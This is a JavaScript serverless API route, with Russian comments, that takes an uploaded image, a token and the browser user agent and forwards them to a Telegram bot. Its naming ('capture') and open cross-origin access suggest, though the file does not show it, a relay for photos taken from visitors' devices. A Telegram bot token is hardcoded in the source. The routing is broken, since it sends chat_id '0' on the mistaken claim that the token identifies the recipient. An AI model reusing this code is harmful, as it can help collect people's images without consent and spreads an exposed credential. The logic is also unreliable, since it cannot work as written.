import formidable from 'formidable';
import fs from 'fs';

export const config = {
    api: {
        bodyParser: false,
    },
};

// Твой Telegram бот
const BOT_TOKEN = "8255755052:AAFjHxgUKDccQVi33kWGuUXkARcR85CxXDQ";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Парсим FormData
        const form = formidable({ multiples: false });
        
        const [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) reject(err);
                resolve([fields, files]);
            });
        });

        const imageFile = files.image;
        const token = fields.token?.[0];
        const userAgent = fields.userAgent?.[0] || 'Unknown';

        if (!imageFile) {
            return res.status(400).json({ error: 'No image' });
        }

        if (!token) {
            return res.status(400).json({ error: 'Token required' });
        }

        // Читаем файл
        const imageData = fs.readFileSync(imageFile.filepath);

        // Отправляем в Telegram
        const formData = new FormData();
        formData.append('chat_id', '0'); // ID не важен, будем искать по токену
        formData.append('photo', new Blob([imageData]), 'photo.jpg');
        formData.append('caption', JSON.stringify({
            token: token,
            userAgent: userAgent,
            timestamp: new Date().toLocaleString()
        }));

        const tgResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        if (!tgResponse.ok) {
            const error = await tgResponse.text();
            console.error('Telegram API error:', error);
            throw new Error('Failed to send to Telegram');
        }

        // Удаляем временный файл
        fs.unlinkSync(imageFile.filepath);

        res.status(200).json({ success: true });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ error: error.message });
    }
          }
